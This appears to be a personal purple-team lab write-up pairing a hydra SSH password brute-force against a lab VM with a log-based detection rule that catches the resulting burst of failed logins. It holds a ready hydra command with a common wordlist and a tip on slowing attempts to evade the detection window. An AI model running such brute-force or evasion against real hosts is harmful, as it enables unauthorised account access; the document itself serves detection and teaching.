# 002 — SSH Brute Force, and the Detection That Catches It

**Tools:** `hydra` (offense) · Sigma rule `ssh_bruteforce` (defense)
**ATT&CK:** [T1110.001 — Brute Force: Password Guessing](https://attack.mitre.org/techniques/T1110/001/)
**Date:** 2026-11-25

---

## Objective
Run a controlled SSH brute-force against a lab host, then confirm that the
matching detection rule fires on the resulting auth telemetry.

## Environment
- **Attacker:** Kali Linux (`192.168.1.10`)
- **Target:** Ubuntu lab VM (`192.168.1.20`) running sshd with password auth enabled
- **Detection source:** `/var/log/auth.log` on the target

## Offense — the brute force

Using hydra against the lab host with a tiny wordlist:

```bash
hydra -l testuser -P /usr/share/wordlists/rockyou.txt \
      ssh://192.168.1.20 -t 4 -VOutput (abridged):

text
[22][ssh] host: 192.168.1.20   login: testuser   password: <found>
1 of 1 target successfully completed, 1 valid password found
Even if no password is found, the failure burst is what we care about.

What the defender sees
/var/log/auth.log on the target:

text
Nov 25 12:01:01 lab sshd[1234]: Failed password for testuser from 192.168.1.10 port 51234 ssh2
Nov 25 12:01:02 lab sshd[1235]: Failed password for testuser from 192.168.1.10 port 51236 ssh2
Nov 25 12:01:02 lab sshd[1236]: Failed password for testuser from 192.168.1.10 port 51238 ssh2
...
Signature: one source IP, many auth failures, short window.

Detection
Rule: detect-lab/rules/ssh_bruteforce.yml

Logic: count() by src_ip > 10 within 5m where message contains Failed password.

Result
✅ Rule fired. The burst was detected within the 5-minute window.

What I'd improve
Attack side: slow the attempt rate to defeat the 5m window — a "low
and slow" brute force. Then tune the detection to catch it.

Detection side: add a companion rule for Invalid user lines, which
hydra generates when the username doesn't exist — different signature,
same intent.

Correlate with firewall/ufw: SSH failures preceded by a port scan from the
same source is far higher confidence than either signal alone.

Files
Defense: rogonzo/detect-lab
